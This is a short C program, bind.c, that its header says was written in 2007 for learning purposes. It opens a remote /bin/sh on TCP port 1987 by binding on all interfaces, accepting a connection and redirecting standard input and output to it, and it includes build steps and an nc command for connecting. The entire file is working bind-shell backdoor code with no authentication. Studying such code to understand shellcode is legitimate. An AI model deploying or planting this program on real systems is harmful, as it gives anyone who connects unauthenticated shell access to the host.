/*
 *  bind.c - A remote /bin/sh.
 *
 *  Opens a remote /bin/sh on port 1987.
 *
 *  Carlos Reventlov <carlos@reventlov.com>.
 *  This program was written in 2007 for learning purposes.
 *
 *  On the host side:
 *    $ gcc -o bind bind.c
 *    $ ./bind
 *
 *  On the remote side:
 *    $ nc <host> 1987
 *
 *  If you want to know more, please see the ASM equivalent and the shellcode
 *  too.
 *
 * */

/* Random stuff this program seems to require in order to run. */
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

/* Local port. */
#define PORT 1987

/* Local IP address. */
#define REMOTE_IP INADDR_ANY

/* Command we are going to execute after connection. */
#define COMMAND "/bin/sh\0"

int main() {

  // Socket and connection file descriptors.
  int sock, conn;

  // Local address for bind().
  struct sockaddr_in local;

  // Argument for execve.
  char *program[] = {
    COMMAND,
    '\0'
  };

  // Creating an IPV4 PF_INET socket.
  sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

  // Preparing listenning address.
  local.sin_family = PF_INET;
  local.sin_port = htons(PORT);
  local.sin_addr.s_addr = (REMOTE_IP == INADDR_ANY) ? INADDR_ANY : inet_addr(REMOTE_IP);

  // Assigning <local> address to <socket>.
  bind(sock, (struct sockaddr *)&local, sizeof(struct sockaddr_in));

  // Making the socket listen for a connection.
  listen(sock, 0);
  printf("Waiting for connection.\n");

  // When a connection is received accept it and get the file descriptor.
  conn = accept(sock, 0, 0);
  printf("Got connection!\n");

  // This is the actual magic.
  //
  // Redirecting standard input, output and error into the <conn> file
  // descriptor before invoking the command so the remote player can see
  // and write to the command over the wire.
  dup2(conn, STDIN_FILENO);
  dup2(conn, STDOUT_FILENO);
  dup2(conn, STDERR_FILENO);

  // Writing a friendly hello message to the remote player.
  write(conn, "Go on!\n", 7);

  // Actually executing command. Remember everything is going to be redirected
  // to <conn>.
  execve(program[0], program, 0);

  // Prepare a clean exit.
  exit(0);
}
